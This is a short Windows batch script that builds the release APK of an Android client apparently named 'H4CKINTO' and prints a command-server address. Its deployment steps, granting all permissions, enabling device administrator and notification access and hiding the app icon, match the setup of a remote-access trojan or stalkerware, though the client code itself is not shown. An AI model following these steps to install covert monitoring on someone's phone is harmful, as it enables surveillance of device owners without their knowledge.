@echo off
echo Building H4CKINTO Android Client...
echo.

cd client_new

echo Building APK...
call gradlew assembleRelease

if %errorlevel% equ 0 (
    echo.
    echo ✓ Build successful!
    echo.
    echo APK location: client_new\app\build\outputs\apk\release\app-release.apk
    echo.
    echo Server Configuration:
    echo - Server IP: 192.168.1.101
    echo - Server Port: 9400
    echo - Server URL: http://192.168.1.101:9400
    echo.
    echo Instructions:
    echo 1. Install the APK on your Android device
    echo 2. Grant all permissions when prompted
    echo 3. Enable device administrator access
    echo 4. Enable notification access
    echo 5. Optionally hide the app icon
    echo.
) else (
    echo.
    echo ✗ Build failed! Please check the error messages above.
    echo.
)

pause
